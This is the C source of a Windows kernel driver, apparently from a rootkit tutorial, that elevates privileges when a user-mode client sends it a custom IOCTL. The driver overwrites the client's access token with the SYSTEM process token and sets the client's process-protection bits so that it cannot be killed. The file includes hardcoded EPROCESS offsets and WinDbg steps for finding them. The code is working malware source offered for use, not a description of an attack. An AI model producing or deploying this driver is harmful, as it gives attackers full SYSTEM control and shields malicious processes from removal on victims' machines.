#include <ntifs.h>
#include <ntddk.h>

// An IOCTL code is just an 32bit interger that packs different parameters together
// we calling it IOCTL_INVINCIBLE_PROCESS
// Custom IOCTL Code:
#define IOCTL_INVINCIBLE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define EPROCESS_TOKEN_OFFSET 0x248
#define EPROCESS_PROTECTION_OFFSET 0x5fa

/*2
	Parameters in order:
	FILE_DEVICE_UNKOWN			is just the devicetype
	0x803						is the function code,	|	unique id number set exclusively for this code. Must be in the range of 0x800-0xFFF because 0x000-0x7FF is reserved by microsoft for windows System commands
	METHOD_BUFFERED				is the transfer method	|	safest option. Tells windows to take whatever data our usermode program sends, allocate a safe buffer for it in kernel memory, and copy this data into this allocated buffer
	FILE_ANY_ACCESS				requires acces			|	Any process or program that has an open handle on our kernel driver can send this IOCTL code

	If you want to define another IOCTL code just change the function code, IE: 0x804;
	After compiling our IOCTL Code will look something like this: 0x002200C
*/

UNICODE_STRING DeviceName;
UNICODE_STRING SymLinkName;

// _PS_PROTECTION Union
typedef struct _PS_PROTECTION {
	union {
		UCHAR Level;
		struct {
			UCHAR Type : 3;
			UCHAR Audit : 1;
			UCHAR Signer : 4;
		} Bits;
	} Fields;
} PS_PROTECTION, * PPS_PROTECTION;

ULONG IoGetRequestorProcessId(_In_ PIRP Irp);
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(_In_ HANDLE ProcessId, _Outptr_ PEPROCESS* Process);

VOID UnloadRoutine(_In_ PDRIVER_OBJECT DriverObject)
{
	// Deleting Link then Device
	// If you delete device before SymLink you get a dangling symlink
	IoDeleteSymbolicLink((PUNICODE_STRING)&SymLinkName);
	if (DriverObject->DeviceObject != NULL)
		IoDeleteDevice(DriverObject->DeviceObject);
}

// Thius IRP is triggered whenever a usermode program sends an IOCTL code using thge DeviceIoControl controlwinAPI that looks like this:
// Bool Success = DeviceIoControl(handle, IOCTL_CODE, ...);

// To find Token offset in windows, they are all structured the same. So open WinDBG64 as admin, kernel debug, local, then type "!process 0 0 notepad.exe". makje sure notepad.exe is open. 
// this dumps the base address, with the base address do  "dt nt!_EPROCESS ffff8085b29d00" and look for the token offset 
VOID StealSystemToken(HANDLE pid) {
	NTSTATUS status;

	// Pointers to the SYSTEM process EPROCESS and the rootkit client EPROCESS
	PEPROCESS systemProcess = NULL;
	PEPROCESS rootkitClientProcess = NULL;

	// Locate the EPROCESS structure for the System process (Always PID 4)
	status = PsLookupProcessByProcessId((HANDLE)4, &systemProcess);
	if (NT_SUCCESS(status)) {

		// Locate the EPROCESS structure for our usermode rootkit client
		status = PsLookupProcessByProcessId(pid, &rootkitClientProcess);
		if (NT_SUCCESS(status)) {

			// Calculate the absolute virtual address of both access tokens
			PULONG_PTR SystemTokenPtr = (PULONG_PTR)((PUCHAR)systemProcess + EPROCESS_TOKEN_OFFSET);
			PULONG_PTR rootkitClientTokenPtr = (PULONG_PTR)((PUCHAR)rootkitClientProcess + EPROCESS_TOKEN_OFFSET);
			// You typecast ERPOCESS to PUCHAR to be able to do pointer arithmetic addition at byte level. Then we type cast the resulint pointer back to a PLONGPTR type
			// Which is just a pointer to an unsigned integer

			// Overwrite the rootkit client's token with the System token
			// Dereference both pointers and overwrite rootkitClientTokenPtr to equal systems token
			*rootkitClientTokenPtr = *SystemTokenPtr;


			PPS_PROTECTION rootkitClientProtectionPtr = (PPS_PROTECTION)((PUCHAR)rootkitClientProcess + EPROCESS_PROTECTION_OFFSET);

			// Set each bit field individually
			rootkitClientProtectionPtr->Fields.Bits.Type = 2;
			rootkitClientProtectionPtr->Fields.Bits.Audit = 0;
			rootkitClientProtectionPtr->Fields.Bits.Signer = 7;
		}
	}

	// Decrement reference counts for both EPROCESS structures
	if (systemProcess != NULL) ObDereferenceObject(systemProcess);
	if (rootkitClientProcess != NULL) ObDereferenceObject(rootkitClientProcess);

	/*
		Each EPROCESS structure has a reference count that gets incremented each time a kernel driver attempts to read any data from it
		as long as the reference count is more than 0 then it will always remain in kernel memory even if thew usermode program that is associated with the EPROCESS strucutre is closed
		the kernel will freeze the structure in memory until it drops to 0

		when we look up PsLookupProcessByProcessId we increment the reference count by one so above we decrement the reference count by one to not get a BSOD and to kill the kernel memory.
	*/
}



NTSTATUS DeviceControlHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;

	// Using IoGetCurrentIrpStackLocation API to get a pointer to the irp in kernel memory that was sent by our usermode program
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	// Now extract the ioctl code and check if it equals our IOCTL_INVINCIBLE_PROCESS
	ULONG ioctlCode = stack->Parameters.DeviceIoControl.IoControlCode;

	if (ioctlCode == IOCTL_INVINCIBLE_PROCESS) {                             // if (ioctlCode = 0x002200C)
		// if it equals our IOCTLCode then we get the process ID of our usermode program using the iogetRequestorProcessId API
		HANDLE rootkitClientPid = (HANDLE)IoGetRequestorProcessId(Irp);
		// Then pass the PID to our StealSystemToken Function=
		StealSystemToken(rootkitClientPid);
	}
	else {
		// If it doesn't equal our PID then send invalid request code 
		status = STATUS_INVALID_DEVICE_REQUEST;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}


NTSTATUS CreateCloseHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

extern "C"
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	// We wont specify Registry path here so we just tell the compiler we won't be referencing the path
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status;
	PDEVICE_OBJECT DeviceObject = NULL;


	RtlInitUnicodeString(&DeviceName, L"\\Device\\TokenStealerDevice");
	RtlInitUnicodeString(&SymLinkName, L"\\??\\TokenStealerDeviceLink");

	// Create Device
	status = IoCreateDevice(DriverObject,			//1. Pointer to driver object
		0,											// 2. Device extension Size      | Written in bytes, we dont care here so we set it to 0
		&DeviceName,								// 3. Device name
		FILE_DEVICE_UNKNOWN,						// 4. Device type                |  This is usually used to determine what type of device is connected like a keyboard, printer or network card but since we're software only control driver that doesnt map to physical driver just use unknown  
		FILE_DEVICE_SECURE_OPEN,					// Device characteristics        |  This flag prevents any usermode process from injecting abritray subpath into the device sym link
		FALSE,										// 6. Exclusive device           | If set to true, only one usermode process can open a handle at a given time, any other process attempting to open a handle will be denied. if false multiple can opena  handle 
		&DeviceObject);								// 7. pointer to device object   | Just stores metadata about device

	if (!NT_SUCCESS(status))
		return status;

	// Create Symbolic link for device
	// First parameter takes in a pointer to the SymLinkName and a pointer to the DeviceName
	status = IoCreateSymbolicLink((PUNICODE_STRING)&SymLinkName, (PUNICODE_STRING)&DeviceName);

	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// Not directed in video but after you create SymLink you can start adding code that does the stuffs

	// IRP Define here
	// Create IRP is triggered whenever a usermode program tries to open a handle to kernel driver the windows API using "CreateFile(TokenStealerDeviceLink"
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseHandler;
	// ATtempts to close handle to driver
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseHandler;
	// Usermode program sends an IOCTL code ot the kernel driver
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlHandler;


	DriverObject->DriverUnload = UnloadRoutine;

	return STATUS_SUCCESS;
}